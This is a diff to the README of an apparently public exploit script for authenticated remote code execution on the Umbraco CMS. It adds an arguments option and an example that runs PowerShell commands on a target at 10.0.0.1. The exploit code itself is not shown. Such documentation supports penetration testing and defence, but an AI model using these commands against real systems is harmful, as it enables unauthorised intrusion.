@@ -6,22 +6,24 @@
 
 ```
 $ python exploit.py -h
-usage: exploit.py [-h] -u USER -p PASS -i URL -c CMD
+usage: exploit.py [-h] -u USER -p PASS -i URL -c CMD [-a ARGS]
 
 Umbraco authenticated RCE
 
 optional arguments:
-  -h, --help                show this help message and exit
-  -u USER, --user USER      username / email
-  -p PASS, --password PASS  password
-  -i URL, --host URL        root URL
-  -c CMD, --command CMD     command
+  -h, --help                 show this help message and exit
+  -u USER, --user USER       username / email
+  -p PASS, --password PASS   password
+  -i URL, --host URL         root URL
+  -c CMD, --command CMD      command
+  -a ARGS, --arguments ARGS  arguments
 ```
 
-Example:
+Examples:
 
 ```
 $ python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c ipconfig
+$ python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c powershell.exe -a '-NoProfile -Command ls'
 ```
 
 ## Reference
